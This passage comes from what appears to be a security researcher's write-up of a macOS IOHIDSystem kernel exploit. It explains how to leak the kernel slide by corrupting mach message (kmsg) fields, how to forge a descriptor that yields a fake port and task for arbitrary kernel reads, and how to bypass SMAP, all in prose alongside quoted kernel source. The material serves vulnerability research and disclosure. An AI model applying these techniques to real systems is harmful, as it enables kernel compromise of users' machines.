&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proximityChange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocationDelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cursorMoved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// mouse moved, but cursor didn't
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursorLoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursorLoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinScreen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;updateScreenLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;screen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopBounds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;screen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;displayBounds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;updateScreenLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;screenCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getScreenLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;screenCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getScreenLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; block is very unlikely to be entered since &lt;code class=&quot;highlighter-rouge&quot;&gt;_cursorHelper&lt;/code&gt; has just been updated with the values from &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorLoc&lt;/code&gt;, which are in my experience very unlikely to match those of &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt; (at least if they’re useful in any way). If the &lt;code class=&quot;highlighter-rouge&quot;&gt;else&lt;/code&gt; branch is entered, &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; will be written to. Basically if &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorSema == 0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; will be written to. This may or may not be a problem, depending on the memory structure we’re intersecting with.&lt;/p&gt;
&lt;p&gt;Sounds like fun! :P&lt;/p&gt;
&lt;h3 id=&quot;leaking-the-kernel-slide-the-tedious-way&quot;&gt;Leaking the kernel slide, the tedious way&lt;/h3&gt;
&lt;p&gt;No matter what we wanna do to the kernel, at some point we’re gonna have to defeat KASLR and learn the kernel slide. If we intend to run some ROP, we need that pretty early on even. So how do we get there?&lt;/p&gt;
&lt;p&gt;The prime candidates for revealing the kernel slide are usually pointers in some dynamically allocated structures, which point back to the main kernel binary, often to functions, strings, or C++ vtables. With our ability to read 4 bytes of memory off a choosable memory structure, that sounds pretty easy. That is, until you realise that virtually all of those structures are small enough to be handled by zalloc, i.e. we cannot get them to the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; or the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;. In fact, I have yet to learn of any object that is or can be made large enough to not be handled by zalloc, and which contains any pointers to the main kernel binary whatsoever. If you know of one, please do tell me!&lt;/p&gt;
&lt;p&gt;But let’s not despair over that, and instead have a look at what structures we &lt;em&gt;can&lt;/em&gt; allocate onto the &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc_map&lt;/code&gt; or the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;. Here’s a list of the ones I know, quite possibly incomplete:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Data buffers. Examples include &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt; or some forms of &lt;code class=&quot;highlighter-rouge&quot;&gt;IOBufferMemoryDescriptor&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Pointer arrays. Examples are the “buffers” allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;OSArray&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;OSDictionary&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;struct ipc_kmsg&lt;/code&gt;. The container within which mach messages are wrapped.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Data buffers contain exclusively user-supplied data, so reading from them is entirely useless, and with writing we could at most break some assumptions that were established through sanitisation earlier, but… meh. Pointer arrays contain exclusively pointers to dynamically allocated objects, so corrupting them might get us code execution if we know an address where we can put a fake object, and reading from them might just tell us where such an address might be once the object is freed. However, neither of those gets us any closer to the kernel slide. That leaves only kmsg’s… and boy are kmsg’s something!&lt;/p&gt;
&lt;p&gt;Let’s take a closer look at kmsg’s and to that end, mach messages. When a client sends a mach message, it consists of a &lt;em&gt;header&lt;/em&gt; containing the size of the message, destination port, etc., and of a &lt;em&gt;body&lt;/em&gt;. That body can contain “descriptors”, which can be out-of-line memory, an out-of-line array of mach ports, or a single inline mach port. Body space not used up by descriptors is just copied 1:1. That gives us a byte buffer of arbitrary size containing both binary data as well as pointers!&lt;br/&gt;When a message enters kernelland through the &lt;code class=&quot;highlighter-rouge&quot;&gt;mach_msg&lt;/code&gt; trap, the kernel allocates one large designated buffer for it with an &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_kmsg&lt;/code&gt; header, and copies it there. Then it resolves port names to pointers, translates descriptors, adds a trailer to it that contains information about the sender, and finally adds the kmsg to the message queue of the destination port. Now, the buffer holding the kmsg needs to be significantly larger than the raw mach message, not only due to the kmsg header and the message trailer, but also due to the fact that the size of descriptors is different for 32- and 64-bit contexts. In addition, the function allocating the buffer has no idea whether there will be any descriptors at all or where the message is coming from. It only knows the user-specified message size, so it makes the most protective assumptions, i.e. that small descriptors will have to be translated to big ones, and that the entire message body consists of descriptors. Currently that means for every 12 bytes of body size, the kernel allocates 16 bytes - which means we’ll have to take special care of the size if we wanna fill a mach message into a hole we punched into the heap. Now, also due to variable size and because descriptors always precede any non-descriptor data sent in a message, mach messages are aligned to the &lt;em&gt;end&lt;/em&gt; of the kalloc’ed buffer rather than to the beginning, and the header is pulled backwards as needed when descriptors are translated. To that end, the &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_kmsg&lt;/code&gt; header (which sits at the very beginning of the kalloc allocation btw) has a field &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt;, which points to the header of the mach message.&lt;/p&gt;
&lt;p&gt;Knowing all that, how can we use it to our advantage now? Plain reading seems futile at this point, so is &lt;em&gt;writing&lt;/em&gt; gonna do us any good? Ian Beer has &lt;a href=&quot;https://googleprojectzero.blogspot.com/2017/04/exception-oriented-exploitation-on-ios.html&quot;&gt;previously exploited kmsg’s&lt;/a&gt; by corrupting the &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_size&lt;/code&gt; field in &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_kmsg&lt;/code&gt;, leading to a heap overflow allowing both controlled reading and writing. That requires appropriate objects to reside after the kmsg in memory however, which isn’t the case for us (otherwise we’d just move &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; a couple of pages further and mess with those).&lt;br/&gt;What other values do we have? Most fields are pointers whose corruption would require far-reaching construction of fake objects, and the few that are not are mostly just flat-out copied to userland. &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header-&amp;gt;msgh_size&lt;/code&gt; is used for the size of the copy-out, but corrupting that would just yield another heap overflow. We could corrupt &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt; which would allow us to construct an entire custom mach message, however that would require some valid ports pointers at the very least (which we could read off the original mach message one by one, but that’s tedious). There is another, much nicer field though, which allows us to get basically the same result with much less effort: &lt;code class=&quot;highlighter-rouge&quot;&gt;msgh_descriptor_count&lt;/code&gt;.&lt;br/&gt;Targeting that, we can send a message with a byte buffer and no descriptors, then change &lt;code class=&quot;highlighter-rouge&quot;&gt;msgh_descriptor_count&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, and suddenly on receiving the message, the beginning of our byte buffer will be interpreted as a descriptor! :D&lt;/p&gt;
&lt;p&gt;The details for this are really simple: &lt;code class=&quot;highlighter-rouge&quot;&gt;msgh_descriptor_count&lt;/code&gt; is a 32-bit int, we’ve already looked at how to write 32 bits of memory after offsetting &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, and targeting the least significant bit fits nicely with our writing mask of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x01ff20ff&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;With that figured out, we can create and “send ourselves” anything that a descriptor can describe. The most straightforward choice to me seems a fake mach port with a fake task struct, which will then allow us to read arbitrary memory via &lt;code class=&quot;highlighter-rouge&quot;&gt;pid_for_task&lt;/code&gt;. This technique has previously been used by &lt;a href=&quot;https://twitter.com/qwertyoruiopz&quot;&gt;Luca Todesco&lt;/a&gt; in the &lt;a href=&quot;https://github.com/kpwn/yalu102&quot;&gt;Yalu102 jailbreak&lt;/a&gt;, and subsequently by &lt;a href=&quot;https://twitter.com/tihmstar&quot;&gt;tihmstar&lt;/a&gt; and yours truly in &lt;a href=&quot;http://newosxbook.com/files/PhJB.pdf&quot;&gt;Phœnix&lt;/a&gt; and &lt;a href=&quot;https://github.com/Siguza/PhoenixNonce&quot;&gt;PhœnixNonce&lt;/a&gt;.&lt;br/&gt;Now in order to pull that off, we need an address at which we can put our fake port and task structs. On devices without SMAP, we could just put those in our process memory and do a dull userland dereference. We’re not gonna do that though, since for one my MacBook (on which I was developing the exploit for the biggest part) is equipped with SMAP, and secondly because it’s always nice to break one more security feature if you can. :P&lt;br/&gt;Alright, so we need a &lt;em&gt;kernel&lt;/em&gt; address - but guess what, we already have one in our kmsg: &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt;! Now, we can’t use that &lt;em&gt;directly&lt;/em&gt; since the entire kmsg will be deallocated once we receive it, but knowing the size of the message we’ve sent, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt; to calculate the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_kmsg&lt;/code&gt; header - and due to the very nature of our exploit, there happens to exist something at a known offset from that address: IOHIDSystem shared memory. So we just made &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6000&lt;/code&gt; bytes of directly writeable, kernel-adressable memory - for getting exploit data into the kernel, it hardly gets any nicer than that!&lt;/p&gt;
&lt;p&gt;So, how does reading &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt; work in detail? Being an address makes it 64 bits wide, which means that we’ll have to read it in two steps. Since every reading operation resets &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, we’ll need to do an entire cycle of deallocating the kmsg, filling the space with buffer memory, offsetting &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; again, and allocating a new kmsg between the two readings. But if the new kmsg has the same size as the old one and is filled into the same heap hole, then &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt; is gonna hold the same value, so that won’t be a problem.&lt;br/&gt;There is one more thing though: remember the &lt;strong&gt;cursor problem&lt;/strong&gt;? To find out how that affects us in this case, let’s have a look at the first few members of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_kmsg&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;EvGlobals&lt;/code&gt; structs:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/1-structs.svg&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/1-structs.svg&quot; alt=&quot;data structure visualisation&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;When reading the top 32 bits of &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt;, they overlay like this:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/2-overlay.svg&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/2-overlay.svg&quot; alt=&quot;heap diagram&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorSema&lt;/code&gt; falls onto the bottom 32 bits of &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_next&lt;/code&gt;, which is a pointer to another kmsg. Since that one will also have been allocated via &lt;code class=&quot;highlighter-rouge&quot;&gt;kalloc&lt;/code&gt;, the lower 32 bits of the pointer are exceedingly unlikely to be zeroes, so in this case we should be safe.&lt;br/&gt;What about the bottom 32 bits of &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_header&lt;/code&gt; then?&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/3-overlay.svg&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/3-overlay.svg&quot; alt=&quot;another heap diagram&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorSema&lt;/code&gt; falls onto the padding between &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_size&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_next&lt;/code&gt;. I don’t see that being zeroed out anywhere in the code so in theory it could be anything, however in practice I have only ever seen zeroes there (and even if that’s not always the case, it remains a possibility). So when we perform our reading operation, &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::_setCursorPosition&lt;/code&gt; will run through and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt; will be written to, which intersect with &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_importance&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_inheritance&lt;/code&gt; (marked red in the diagram). That’s bad. When we receive the kmsg and &lt;code class=&quot;highlighter-rouge&quot;&gt;mach_msg_receive_results&lt;/code&gt; is called, it will invoke &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_importance_receive&lt;/code&gt; which will lead us to this bit (assuming we don’t have a voucher):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IIE_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_importance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ipc_importance_elem_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ipc_importance_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_importance_kmsg_unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#if IIE_REF_DEBUG
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iie_kmsg_refs_dropped&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ipc_importance_release_locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* importance unlocked */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Recall that the values written to &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt; depend on the values previously read from &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorLoc&lt;/code&gt;. Since we’re reading a valid pointer, we will write non-zero values there which means that &lt;code class=&quot;highlighter-rouge&quot;&gt;IIE_NULL != kmsg-&amp;gt;ikm_importance&lt;/code&gt; will hold true and the if block will be entered. That will then lead to a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_importance_kmsg_unlink&lt;/code&gt;, which is defined as follows:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_importance_elem_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ipc_importance_kmsg_unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
